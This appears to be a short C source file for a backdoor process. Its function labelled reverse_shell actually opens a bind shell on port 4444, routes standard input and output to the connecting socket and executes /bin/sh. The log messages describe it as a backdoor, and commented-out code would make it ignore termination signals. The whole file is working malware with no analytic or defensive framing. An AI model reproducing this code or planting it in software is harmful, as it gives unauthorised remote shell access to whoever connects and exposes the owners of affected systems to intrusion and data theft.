#include "revshell.hpp"

void reverse_shell(){
    int host_sockid;    // sockfd for host
    int client_sockid;  // sockfd for client

    struct sockaddr_in hostaddr;            // sockaddr struct

    // Create socket
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);

    // Initialize sockaddr struct to bind socket using it
    hostaddr.sin_family = AF_INET;
    hostaddr.sin_port = htons(4444);
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind socket to IP/Port in sockaddr struct
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));

    // Listen for incoming connections
    listen(host_sockid, 2);

    // Accept incoming connection, don't store data, just use the sockfd created
    client_sockid = accept(host_sockid, NULL, NULL);

    // Duplicate file descriptors for STDIN, STDOUT and STDERR
    dup2(client_sockid, 0);
    dup2(client_sockid, 1);
    dup2(client_sockid, 2);

    // Execute /bin/sh
    execve("/bin/sh", NULL, NULL);
    close(host_sockid);
}


int run_in_main_proc() {
    LOGD("Start successfull!\n");

    /*signal(SIGINT, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTTOU, SIG_IGN);
    signal(SIGTTIN, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGKILL, SIG_IGN);

    LOGD("Signals are set to ignore\n");*/

    int timer_counter = 0;
    int timer_step = 5;

    LOGD("Hey I'm a backdoor process!\n");
    LOGD("My PID -- %d\n", getpid());
    LOGD("My parent PID -- %d\n", getppid());
    LOGD("My UID -- %d\n", getuid());

    LOGD("Starting bind shell  now");
    reverse_shell();

    LOGD("Exit!\n");

    return 0;
}

int main(int argc, char *argv[]) {
    return run_in_main_proc();
}
